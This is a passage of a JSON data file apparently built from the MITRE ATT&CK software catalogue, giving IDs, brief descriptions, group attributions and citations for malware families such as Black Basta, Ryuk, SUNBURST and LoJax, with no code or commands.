      "VBShower"
    ],
    "id": "S0442"
  },
  "malware--8d242fb4-9033-4f13-8a88-4b9b4bcd9a53": {
    "name": "Black Basta",
    "description": "[Black Basta](https://attack.mitre.org/software/S1070) is ransomware written in C++ that has been offered within the ransomware-as-a-service (RaaS) model since at least April 2022; there are variants that target Windows and VMWare ESXi servers. [Black Basta](https://attack.mitre.org/software/S1070) operations have included the double extortion technique where in addition to demanding ransom for decrypting the files of targeted organizations the cyber actors also threaten to post sensitive information to a leak site if the ransom is not paid. [Black Basta](https://attack.mitre.org/software/S1070) affiliates have targeted multiple high-value organizations, with the largest number of victims based in the U.S. Based on similarities in TTPs, leak sites, payment sites, and negotiation tactics, security researchers assess the [Black Basta](https://attack.mitre.org/software/S1070) RaaS operators could include current or former members of the [Conti](https://attack.mitre.org/software/S0575) group.(Citation: Palo Alto Networks Black Basta August 2022)(Citation: Deep Instinct Black Basta August 2022)(Citation: Minerva Labs Black Basta May 2022)(Citation: Avertium Black Basta June 2022)(Citation: NCC Group Black Basta June 2022)(Citation: Cyble Black Basta May 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Black Basta"
    ],
    "id": "S1070"
  },
  "malware--8dbadf80-468c-4a62-b817-4e4d8b606887": {
    "name": "StoneDrill",
    "description": "[StoneDrill](https://attack.mitre.org/software/S0380) is wiper malware discovered in destructive campaigns against both Middle Eastern and European targets in association with [APT33](https://attack.mitre.org/groups/G0064).(Citation: FireEye APT33 Sept 2017)(Citation: Kaspersky StoneDrill 2017)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "StoneDrill"
    ],
    "id": "S0380"
  },
  "malware--8f423bd7-6ca7-4303-9e85-008c7ad5fdaa": {
    "name": "Attor",
    "description": "[Attor](https://attack.mitre.org/software/S0438) is a Windows-based espionage platform that has been seen in use since 2013. [Attor](https://attack.mitre.org/software/S0438) has a loadable plugin architecture to customize functionality for specific targets.(Citation: ESET Attor Oct 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Attor"
    ],
    "id": "S0438"
  },
  "malware--8fc6c9e7-a162-4ca4-a488-f1819e9a7b06": {
    "name": "SQLRat",
    "description": "[SQLRat](https://attack.mitre.org/software/S0390) is malware that executes SQL scripts to avoid leaving traditional host artifacts. [FIN7](https://attack.mitre.org/groups/G0046) has been observed using it.(Citation: Flashpoint FIN 7 March 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SQLRat"
    ],
    "id": "S0390"
  },
  "malware--9020f5c7-efde-4125-a4f1-1b70f1274ddd": {
    "name": "LitePower",
    "description": "[LitePower](https://attack.mitre.org/software/S0680) is a downloader and second stage malware that has been used by [WIRTE](https://attack.mitre.org/groups/G0090) since at least 2021.(Citation: Kaspersky WIRTE November 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LitePower"
    ],
    "id": "S0680"
  },
  "malware--909617c3-6d87-4330-8f32-bd3af38c3b92": {
    "name": "MegaCortex",
    "description": "[MegaCortex](https://attack.mitre.org/software/S0576) is ransomware that first appeared in May 2019. (Citation: IBM MegaCortex) [MegaCortex](https://attack.mitre.org/software/S0576) has mainly targeted industrial organizations. (Citation: FireEye Ransomware Disrupt Industrial Production)(Citation: FireEye Financial Actors Moving into OT)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MegaCortex"
    ],
    "id": "S0576"
  },
  "malware--919a056e-5104-43b9-ad55-2ac929108b71": {
    "name": "BoxCaon",
    "description": "[BoxCaon](https://attack.mitre.org/software/S0651) is a Windows backdoor that was used by [IndigoZebra](https://attack.mitre.org/groups/G0136) in a 2021 spearphishing campaign against Afghan government officials. [BoxCaon](https://attack.mitre.org/software/S0651)'s name stems from similarities shared with the malware family [xCaon](https://attack.mitre.org/software/S0653).(Citation: Checkpoint IndigoZebra July 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BoxCaon"
    ],
    "id": "S0651"
  },
  "malware--91c57ed3-7c32-4c68-b388-7db00cb8dac6": {
    "name": "NightClub",
    "description": "[NightClub](https://attack.mitre.org/software/S1090) is a modular implant written in C++ that has been used by [MoustachedBouncer](https://attack.mitre.org/groups/G1019) since at least 2014.(Citation: MoustachedBouncer ESET August 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "NightClub"
    ],
    "id": "S1090"
  },
  "malware--925a6c52-5cf0-4fec-99de-b0d6917d8593": {
    "name": "Crutch",
    "description": "[Crutch](https://attack.mitre.org/software/S0538) is a backdoor designed for document theft that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2015.(Citation: ESET Crutch December 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Crutch"
    ],
    "id": "S0538"
  },
  "malware--92b03a94-7147-4952-9d5a-b4d24da7487c": {
    "name": "SDBbot",
    "description": "[SDBbot](https://attack.mitre.org/software/S0461) is a backdoor with installer and loader components that has been used by [TA505](https://attack.mitre.org/groups/G0092) since at least 2019.(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SDBbot"
    ],
    "id": "S0461"
  },
  "malware--93289ecf-4d15-4d6b-a9c3-4ab27e145ef4": {
    "name": "QUIETCANARY",
    "description": "[QUIETCANARY](https://attack.mitre.org/software/S1076) is a backdoor tool written in .NET that has been used since at least 2022 to gather and exfiltrate data from victim networks.(Citation: Mandiant Suspected Turla Campaign February 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "QUIETCANARY"
    ],
    "id": "S1076"
  },
  "malware--94d6d788-07bb-4dcc-b62f-e02626b00108": {
    "name": "SodaMaster",
    "description": "[SodaMaster](https://attack.mitre.org/software/S0627) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SodaMaster"
    ],
    "id": "S0627"
  },
  "malware--958b5d06-8bb0-4c5b-a2e7-0130fe654ac7": {
    "name": "Grandoreiro",
    "description": "[Grandoreiro](https://attack.mitre.org/software/S0531) is a banking trojan written in Delphi that was first observed in 2016 and uses a Malware-as-a-Service (MaaS) business model. [Grandoreiro](https://attack.mitre.org/software/S0531) has confirmed victims in Brazil, Mexico, Portugal, and Spain.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Grandoreiro"
    ],
    "id": "S0531"
  },
  "malware--959f3b19-2dc8-48d5-8942-c66813a5101a": {
    "name": "WellMail",
    "description": "[WellMail](https://attack.mitre.org/software/S0515) is a lightweight malware written in Golang used by [APT29](https://attack.mitre.org/groups/G0016), similar in design and structure to [WellMess](https://attack.mitre.org/software/S0514).(Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WellMail"
    ],
    "id": "S0515"
  },
  "malware--95e2cbae-d82c-4f7b-b63c-16462015d35d": {
    "name": "LiteDuke",
    "description": "[LiteDuke](https://attack.mitre.org/software/S0513) is a third stage backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016), primarily in 2014-2015. [LiteDuke](https://attack.mitre.org/software/S0513) used the same dropper as [PolyglotDuke](https://attack.mitre.org/software/S0518), and was found on machines also compromised by [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LiteDuke"
    ],
    "id": "S0513"
  },
  "malware--96eca9b9-b37f-42f1-96dc-a2c441403194": {
    "name": "VaporRage",
    "description": "[VaporRage](https://attack.mitre.org/software/S0636) is a shellcode downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "VaporRage"
    ],
    "id": "S0636"
  },
  "malware--979adb5a-dc30-48f0-9e3d-9a26d866928c": {
    "name": "Sibot",
    "description": "[Sibot](https://attack.mitre.org/software/S0589) is dual-purpose malware written in VBScript designed to achieve persistence on a compromised system as well as download and execute additional payloads. Microsoft discovered three [Sibot](https://attack.mitre.org/software/S0589) variants in early 2021 during its investigation of [APT29](https://attack.mitre.org/groups/G0016) and the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024).(Citation: MSTIC NOBELIUM Mar 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Sibot"
    ],
    "id": "S0589"
  },
  "malware--97cfbdc6-504d-41e9-a46c-78a9f806ff0d": {
    "name": "ZxxZ",
    "description": "[ZxxZ](https://attack.mitre.org/software/S1013) is a trojan written in Visual C++ that has been used by [BITTER](https://attack.mitre.org/groups/G1002) since at least August 2021, including against Bangladeshi government personnel.(Citation: Cisco Talos Bitter Bangladesh May 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ZxxZ"
    ],
    "id": "S1013"
  },
  "malware--988976ff-beeb-4fb5-b07d-ca7437ea66e8": {
    "name": "Tarrask",
    "description": "[Tarrask](https://attack.mitre.org/software/S1011) is malware that has been used by [HAFNIUM](https://attack.mitre.org/groups/G0125) since at least August 2021. [Tarrask](https://attack.mitre.org/software/S1011) was designed to evade digital defenses and maintain persistence by generating concealed scheduled tasks.(Citation: Tarrask scheduled task)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Tarrask"
    ],
    "id": "S1011"
  },
  "malware--99164b38-1775-40bc-b77b-a2373b14540a": {
    "name": "Drovorub",
    "description": "[Drovorub](https://attack.mitre.org/software/S0502) is a Linux malware toolset comprised of an agent, client, server, and kernel modules, that has been used by [APT28](https://attack.mitre.org/groups/G0007).(Citation: NSA/FBI Drovorub August 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Drovorub"
    ],
    "id": "S0502"
  },
  "malware--99854cc8-f202-4e03-aa0a-4f8a4af93229": {
    "name": "Shark",
    "description": "[Shark](https://attack.mitre.org/software/S1019) is a backdoor malware written in C# and .NET that is an updated version of [Milan](https://attack.mitre.org/software/S1015); it has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least July 2021.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Shark"
    ],
    "id": "S1019"
  },
  "malware--99fdf3b4-96ef-4ab9-b191-fc683441cad0": {
    "name": "Bazar",
    "description": "[Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used since at least April 2020, with infections primarily against professional services, healthcare, manufacturing, IT, logistics and travel companies across the US and Europe. [Bazar](https://attack.mitre.org/software/S0534) reportedly has ties to [TrickBot](https://attack.mitre.org/software/S0266) campaigns and can be used to deploy additional malware, including ransomware, and to steal sensitive data.(Citation: Cybereason Bazar July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Bazar"
    ],
    "id": "S0534"
  },
  "malware--9a097d18-d15f-4635-a4f1-189df7efdc40": {
    "name": "PULSECHECK",
    "description": "[PULSECHECK](https://attack.mitre.org/software/S1108) is a web shell written in Perl that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including against Pulse Secure VPNs at US Defense Industrial Base (DIB) companies.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PULSECHECK"
    ],
    "id": "S1108"
  },
  "malware--9abdda30-08e0-4ab1-9cf0-d447654c6de9": {
    "name": "Kobalos",
    "description": "[Kobalos](https://attack.mitre.org/software/S0641) is a multi-platform backdoor that can be used against Linux, FreeBSD, and Solaris. [Kobalos](https://attack.mitre.org/software/S0641) has been deployed against high profile targets, including high-performance computers, academic servers, an endpoint security vendor, and a large internet service provider; it has been found in Europe, North America, and Asia. [Kobalos](https://attack.mitre.org/software/S0641) was first identified in late 2019.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Kobalos"
    ],
    "id": "S0641"
  },
  "malware--9b19d6b4-cfcb-492f-8ca8-8449e7331573": {
    "name": "MESSAGETAP",
    "description": "[MESSAGETAP](https://attack.mitre.org/software/S0443) is a data mining malware family deployed by [APT41](https://attack.mitre.org/groups/G0096) into telecommunications networks to monitor and save SMS traffic from specific phone numbers, IMSI numbers, or that contain specific keywords. (Citation: FireEye MESSAGETAP October 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MESSAGETAP"
    ],
    "id": "S0443"
  },
  "malware--9c10cede-c0bb-4c5c-91c0-8baec30abaf6": {
    "name": "SUGARDUMP",
    "description": "[SUGARDUMP](https://attack.mitre.org/software/S1042) is a proprietary browser credential harvesting tool that was used by UNC3890 during the [C0010](https://attack.mitre.org/campaigns/C0010) campaign. The first known [SUGARDUMP](https://attack.mitre.org/software/S1042) version was used since at least early 2021, a second SMTP C2 version was used from late 2021-early 2022, and a third HTTP C2 variant was used since at least April 2022.(Citation: Mandiant UNC3890 Aug 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SUGARDUMP"
    ],
    "id": "S1042"
  },
  "malware--a020a61c-423f-4195-8c46-ba1d21abba37": {
    "name": "Ryuk",
    "description": "[Ryuk](https://attack.mitre.org/software/S0446) is a ransomware designed to target enterprise environments that has been used in attacks since at least 2018. [Ryuk](https://attack.mitre.org/software/S0446) shares code similarities with Hermes ransomware.(Citation: CrowdStrike Ryuk January 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: FireEye FIN6 Apr 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Ryuk"
    ],
    "id": "S0446"
  },
  "malware--a04d9a4c-bb52-40bf-98ec-e350c2d6a862": {
    "name": "Cryptoistic",
    "description": "[Cryptoistic](https://attack.mitre.org/software/S0498) is a backdoor, written in Swift, that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032).(Citation: SentinelOne Lazarus macOS July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Cryptoistic"
    ],
    "id": "S0498"
  },
  "malware--a0ab8a96-40c9-4483-8a54-3fafa6d6007a": {
    "name": "HermeticWiper",
    "description": "[HermeticWiper](https://attack.mitre.org/software/S0697) is a data wiper that has been used since at least early 2022, primarily against Ukraine with additional activity observed in Latvia and Lithuania. Some sectors targeted include government, financial, defense, aviation, and IT services.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wiper February 2022)(Citation: Qualys Hermetic Wiper March 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HermeticWiper"
    ],
    "id": "S0697"
  },
  "malware--a0ebedca-d558-4e48-8ff7-4bf76208d90c": {
    "name": "ABK",
    "description": "[ABK](https://attack.mitre.org/software/S0469) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ABK"
    ],
    "id": "S0469"
  },
  "malware--a19c1197-9414-46e3-986f-0f609ff4a46b": {
    "name": "Pysa",
    "description": "[Pysa](https://attack.mitre.org/software/S0583) is a ransomware that was first used in October 2018 and has been seen to target particularly high-value finance, government and healthcare organizations.(Citation: CERT-FR PYSA April 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pysa"
    ],
    "id": "S0583"
  },
  "malware--a394448a-4576-41b8-81cc-9b61abad94ab": {
    "name": "ccf32",
    "description": "[ccf32](https://attack.mitre.org/software/S1043) is data collection malware that has been used since at least February 2019, most notably during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign; there is also a similar x64 version.(Citation: Bitdefender FunnyDream Campaign November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ccf32"
    ],
    "id": "S1043"
  },
  "malware--a545456a-f9a7-47ad-9ea6-8b017def38d1": {
    "name": "Pandora",
    "description": "[Pandora](https://attack.mitre.org/software/S0664) is a multistage kernel rootkit with backdoor functionality that has been in use by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2020.(Citation: Trend Micro Iron Tiger April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pandora"
    ],
    "id": "S0664"
  },
  "malware--a5818d36-e9b0-46da-842d-b727a5e36ea6": {
    "name": "WARPWIRE",
    "description": "[WARPWIRE](https://attack.mitre.org/software/S1116) is a Javascript credential stealer that targets plaintext passwords and usernames for exfiltration that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to target Ivanti Connect Secure VPNs.(Citation: Mandiant Cutting Edge January 2024)(Citation: Mandiant Cutting Edge Part 2 January 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WARPWIRE"
    ],
    "id": "S1116"
  },
  "malware--a705b085-1eae-455e-8f4d-842483d814eb": {
    "name": "Cadelspy",
    "description": "[Cadelspy](https://attack.mitre.org/software/S0454) is a backdoor that has been used by [APT39](https://attack.mitre.org/groups/G0087).(Citation: Symantec Chafer Dec 2015)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Cadelspy"
    ],
    "id": "S0454"
  },
  "malware--a7881f21-e978-4fe4-af56-92c9416a2616": {
    "name": "Cobalt Strike",
    "description": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Cobalt Strike"
    ],
    "id": "S0154"
  },
  "malware--a8839c95-029f-44cf-8f3d-a3cf2039e927": {
    "name": "SUNBURST",
    "description": "[SUNBURST](https://attack.mitre.org/software/S0559) is a trojanized DLL designed to fit within the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: SolarWinds Sunburst Sunspot Update January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SUNBURST"
    ],
    "id": "S0559"
  },
  "malware--a8a778f5-0035-4870-bb25-53dc05029586": {
    "name": "EvilBunny",
    "description": "[EvilBunny](https://attack.mitre.org/software/S0396) is a C++ malware sample observed since 2011 that was designed to be a execution platform for Lua scripts.(Citation: Cyphort EvilBunny Dec 2014)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "EvilBunny"
    ],
    "id": "S0396"
  },
  "malware--aad11e34-02ca-4220-91cd-2ed420af4db3": {
    "name": "HotCroissant",
    "description": "[HotCroissant](https://attack.mitre.org/software/S0431) is a remote access trojan (RAT) attributed by U.S. government entities to malicious North Korean government cyber activity, tracked collectively as HIDDEN COBRA.(Citation: US-CERT HOTCROISSANT February 2020) [HotCroissant](https://attack.mitre.org/software/S0431) shares numerous code similarities with [Rifdoor](https://attack.mitre.org/software/S0433).(Citation: Carbon Black HotCroissant April 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HotCroissant"
    ],
    "id": "S0431"
  },
  "malware--aae22730-e571-4d17-b037-65f2a3e26213": {
    "name": "ServHelper",
    "description": "[ServHelper](https://attack.mitre.org/software/S0382) is a backdoor first observed in late 2018. The backdoor is written in Delphi and is typically delivered as a DLL file.(Citation: Proofpoint TA505 Jan 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ServHelper"
    ],
    "id": "S0382"
  },
  "malware--aaf3fa65-8b27-4e68-91de-2b7738fe4c82": {
    "name": "JCry",
    "description": "[JCry](https://attack.mitre.org/software/S0389) is ransomware written in Go. It was identified as apart of the #OpJerusalem 2019 campaign.(Citation: Carbon Black JCry May 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "JCry"
    ],
    "id": "S0389"
  },
  "malware--ac61f1f9-7bb1-465e-9b8a-c2ce8e88baf5": {
    "name": "REvil",
    "description": "[REvil](https://attack.mitre.org/software/S0496) is a ransomware family that has been linked to the [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) group and operated as ransomware-as-a-service (RaaS) since at least April 2019. [REvil](https://attack.mitre.org/software/S0496), which as been used against organizations in the manufacturing, transportation, and electric sectors, is highly configurable and shares code similarities with the GandCrab RaaS.(Citation: Secureworks REvil September 2019)(Citation: Intel 471 REvil March 2020)(Citation: Group IB Ransomware May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "REvil"
    ],
    "id": "S0496"
  },
  "malware--ade37ada-14af-4b44-b36c-210eec255d53": {
    "name": "Valak",
    "description": "[Valak](https://attack.mitre.org/software/S0476) is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Valak"
    ],
    "id": "S0476"
  },
  "malware--ae91fb8f-5031-4f57-9839-e3be3ed503f0": {
    "name": "Samurai",
    "description": "[Samurai](https://attack.mitre.org/software/S1099) is a passive backdoor that has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) since at least 2020. [Samurai](https://attack.mitre.org/software/S1099) allows arbitrary C# code execution and is used with multiple modules for remote administration and lateral movement.(Citation: Kaspersky ToddyCat June 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Samurai"
    ],
    "id": "S1099"
  },
  "malware--aea6d6b8-d832-4c90-a1bb-f52c6684db6c": {
    "name": "Milan",
    "description": "[Milan](https://attack.mitre.org/software/S1015) is a backdoor implant based on [DanBot](https://attack.mitre.org/software/S1014) that was written in Visual C++ and .NET. [Milan](https://attack.mitre.org/software/S1015) has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2020.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Milan"
    ],
    "id": "S1015"
  },
  "malware--b2b0b946-be0a-4a7f-9c32-a2e5211d1cd9": {
    "name": "SUPERNOVA",
    "description": "[SUPERNOVA](https://attack.mitre.org/software/S0578) is an in-memory web shell written in .NET C#. It was discovered in November 2020 during the investigation of [APT29](https://attack.mitre.org/groups/G0016)'s SolarWinds cyber operation but determined to be unrelated. Subsequent analysis suggests [SUPERNOVA](https://attack.mitre.org/software/S0578) may have been used by the China-based threat group SPIRAL.(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: Unit42 SUPERNOVA Dec 2020)(Citation: SolarWinds Advisory Dec 2020)(Citation: CISA Supernova Jan 2021)(Citation: Microsoft Analyzing Solorigate Dec 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SUPERNOVA"
    ],
    "id": "S0578"
  },
  "malware--b2d134a1-7bd5-4293-94d4-8fc978cb1cd7": {
    "name": "Kivars",
    "description": "[Kivars](https://attack.mitre.org/software/S0437) is a modular remote access tool (RAT), derived from the Bifrost RAT, that was used by [BlackTech](https://attack.mitre.org/groups/G0098) in a 2010 campaign.(Citation: TrendMicro BlackTech June 2017)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Kivars"
    ],
    "id": "S0437"
  },
  "malware--b30d999d-64e0-4e35-9856-884e4b83d611": {
    "name": "CaddyWiper",
    "description": "[CaddyWiper](https://attack.mitre.org/software/S0693) is a destructive data wiper that has been used in attacks against organizations in Ukraine since at least March 2022.(Citation: ESET CaddyWiper March 2022)(Citation: Cisco CaddyWiper March 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CaddyWiper"
    ],
    "id": "S0693"
  },
  "malware--b350b47f-88fe-4921-8538-6d9c59bac84e": {
    "name": "Cyclops Blink",
    "description": "[Cyclops Blink](https://attack.mitre.org/software/S0687) is a modular malware that has been used in widespread campaigns by [Sandworm Team](https://attack.mitre.org/groups/G0034) since at least 2019 to target Small/Home Office (SOHO) network devices, including WatchGuard and Asus. [Cyclops Blink](https://attack.mitre.org/software/S0687) is assessed to be a replacement for [VPNFilter](https://attack.mitre.org/software/S1010), a similar platform targeting network devices.(Citation: NCSC Cyclops Blink February 2022)(Citation: NCSC CISA Cyclops Blink Advisory February 2022)(Citation: Trend Micro Cyclops Blink March 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Cyclops Blink"
    ],
    "id": "S0687"
  },
  "malware--b4783be3-35d9-4a56-ac8d-1f3e1c9d9a84": {
    "name": "NativeZone",
    "description": "[NativeZone](https://attack.mitre.org/software/S0637) is the name given collectively to disposable custom [Cobalt Strike](https://attack.mitre.org/software/S0154) loaders used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)(Citation: SentinelOne NobleBaron June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "NativeZone"
    ],
    "id": "S0637"
  },
  "malware--b51797f7-57da-4210-b8ac-b8632ee75d70": {
    "name": "TajMahal",
    "description": "[TajMahal](https://attack.mitre.org/software/S0467) is a multifunctional spying framework that has been in use since at least 2014. [TajMahal](https://attack.mitre.org/software/S0467) is comprised of two separate packages, named Tokyo and Yokohama, and can deploy up to 80 plugins.(Citation: Kaspersky TajMahal April 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TajMahal"
    ],
    "id": "S0467"
  },
  "malware--b57f419e-8b12-49d3-886b-145383725dcd": {
    "name": "PLEAD",
    "description": "[PLEAD](https://attack.mitre.org/software/S0435) is a remote access tool (RAT) and downloader used by [BlackTech](https://attack.mitre.org/groups/G0098) in targeted attacks in East Asia including Taiwan, Japan, and Hong Kong.(Citation: TrendMicro BlackTech June 2017)(Citation: JPCert PLEAD Downloader June 2018) [PLEAD](https://attack.mitre.org/software/S0435) has also been referred to as [TSCookie](https://attack.mitre.org/software/S0436), though more recent reporting indicates likely separation between the two. [PLEAD](https://attack.mitre.org/software/S0435) was observed in use as early as March 2017.(Citation: JPCert TSCookie March 2018)(Citation: JPCert PLEAD Downloader June 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PLEAD"
    ],
    "id": "S0435"
  },
  "malware--b7010785-699f-412f-ba49-524da6033c76": {
    "name": "GoldFinder",
    "description": "[GoldFinder](https://attack.mitre.org/software/S0597) is a custom HTTP tracer tool written in Go that logs the route a packet takes between a compromised network and a C2 server. It can be used to inform  threat actors of potential points of discovery or logging of their actions, including C2 related to other malware. [GoldFinder](https://attack.mitre.org/software/S0597) was discovered in early 2021 during an investigation into the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) by [APT29](https://attack.mitre.org/groups/G0016).(Citation: MSTIC NOBELIUM Mar 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GoldFinder"
    ],
    "id": "S0597"
  },
  "malware--b865dded-0553-4962-a44b-6fe7863effed": {
    "name": "LoJax",
    "description": "[LoJax](https://attack.mitre.org/software/S0397) is a UEFI rootkit used by [APT28](https://attack.mitre.org/groups/G0007) to persist remote access software on targeted systems.(Citation: ESET LoJax Sept 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LoJax"
    ],
    "id": "S0397"
  },
  "malware--b8d48deb-450c-44f6-a934-ac8765aa89cb": {
    "name": "DanBot",
    "description": "[DanBot](https://attack.mitre.org/software/S1014) is a first-stage remote access Trojan written in C# that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least 2018.(Citation: SecureWorks August 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DanBot"
    ],
    "id": "S1014"
  },
  "malware--b9704a7d-feef-4af9-8898-5280f1686326": {
    "name": "GoldenSpy",
    "description": "[GoldenSpy](https://attack.mitre.org/software/S0493) is a backdoor malware which has been packaged with legitimate tax preparation software. [GoldenSpy](https://attack.mitre.org/software/S0493) was discovered targeting organizations in China, being delivered with the \"Intelligent Tax\" software suite which is produced by the Golden Tax Department of Aisino Credit Information Co. and required to pay local taxes.(Citation: Trustwave GoldenSpy June 2020) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GoldenSpy"
    ],
    "id": "S0493"
  },
  "malware--ba09b86c-1c40-4ff1-bda0-0d8c4ca35997": {
    "name": "Ramsay",
    "description": "[Ramsay](https://attack.mitre.org/software/S0458) is an information stealing malware framework designed to collect and exfiltrate sensitive documents, including from air-gapped systems. Researchers have identified overlaps between [Ramsay](https://attack.mitre.org/software/S0458) and the [Darkhotel](https://attack.mitre.org/groups/G0012)-associated Retro malware.(Citation: Eset Ramsay May 2020)(Citation: Antiy CERT Ramsay April 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Ramsay"
    ],
    "id": "S0458"
  },
  "malware--bbcd7a02-ef24-4171-ac94-a93540173b94": {
    "name": "Carberp",
    "description": "[Carberp](https://attack.mitre.org/software/S0484) is a credential and information stealing malware that has been active since at least 2009. [Carberp](https://attack.mitre.org/software/S0484)'s source code was leaked online in 2013, and subsequently used as the foundation for the [Carbanak](https://attack.mitre.org/software/S0030) backdoor.(Citation: Trend Micro Carberp February 2014)(Citation: KasperskyCarbanak)(Citation: RSA Carbanak November 2017)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Carberp"
    ],
    "id": "S0484"
  },
  "malware--bcaae558-9697-47a2-9ec7-c75000ddf58c": {
    "name": "FRAMESTING",
